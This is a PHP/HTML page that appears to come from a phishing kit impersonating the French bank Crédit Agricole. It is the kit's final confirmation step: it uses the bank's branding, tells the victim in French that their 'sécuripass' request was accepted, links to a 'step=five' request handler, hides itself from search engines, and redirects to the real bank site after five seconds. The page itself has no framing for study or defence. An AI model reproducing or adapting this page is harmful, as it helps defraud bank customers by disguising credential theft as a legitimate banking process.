
<?php
    $page = 'default';
    require_once 'init.php';
    if(!isset($_GET['id'])):
        die(rediret($link)); // We're done here
    else:
      $action = './request.php?step=five&'.$id;

?>
<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
  <!-- Meta Tags -->
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
  <meta name="theme-color" content="#6dc77a"/>
  <meta name="msapplication-navbutton-color" content="#6dc77a"/>
  <meta http-equiv="Refresh" content="5; url=https://www.credit-agricole.fr/">
  <link rel="icon" type="image/png" href="CA_Logo_seul-1.svg" />
  <meta name="apple-mobile-web-app-status-bar-style" content="#6dc77a" />
  <link rel="stylesheet" href="<?php echo $css1; ?>" type="text/css">
  <link rel="stylesheet" href="<?php echo $css2; ?>" type="text/css">
  <link rel="stylesheet" href="<?php echo $css3; ?>" type="text/css">
  <link rel="stylesheet" href="<?php echo $css4; ?>" type="text/css">
  <title></title>
</head>

  <body class="BodyLogin">


   <main>
      <div class="Login">
         <div class="Login-header js-Header">
            <a href="" class="Login-logo Login-logo-js">
               <div class="Login-logoImg js-needFakeNotSvg" style="position: relative;"><img class="" src="<?php echo $img; ?>/CA_Logo_seul-1.svg" alt="Crédit Agricole - Banque et assurances" style="position: absolute; top: 50%; left: 50%; max-width: 100%; max-height: 100px; height: 100%; transform: translate(-50%, -50%);"><img src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAQwAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMAAwICAgICAwICAgMDAwMEBgQEBAQECAYGBQYJCAoKCQgJCQoMDwwKCw4LCQkNEQ0ODxAQERAKDBITEhATDxAQEP/bAEMBAwMDBAMECAQECBALCQsQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEP/AABEIACgA2AMBIgACEQEDEQH/xAAVAAEBAAAAAAAAAAAAAAAAAAAACf/EABQQAQAAAAAAAAAAAAAAAAAAAAD/xAAUAQEAAAAAAAAAAAAAAAAAAAAA/8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEQMRAD8AlUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD//2Q==" style="opacity: 0; max-width: 100%; max-height: 100%; visibility: hidden;"></div>
            </a>
            <a href="#" class="Header-login" id="Login-close" tabindex="0" role="button" aria-label="Quitter l'accès à mon espace"></a>
         </div>
         <div class="container-fluid Template" style="margin-top: 60px;">
            <div class="row js-Template-head">

               <div class="col-xs-12 col-md-20">
                  <div class="Template-reduceMargin15px">
                     <div class="Login-container">
                        <div class="row row-no-padding">

                              <div class="GeolocComponent GeolocationDisabled section">
                                <div class="success text-center">
                                    <div class="img" style=""><img src="<?php echo $img; ?>/0de41a3c5953fba1755ebd416ec109dd.gif"></div>
                                    <h3 style="margin-top: 10px; margin-bottom: 10px;">Félicitation!</h3>
                                    <p>
                                        Votre demande à bien été prise en compte.<br>
                                        Votre sécuripass sera actif dans un délais de 72h.
                                    </p>
                                </div>

                              </div>

                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </div>
   </main>

</body>
</html>
<?php
    endif;
    ob_end_flush();
?>
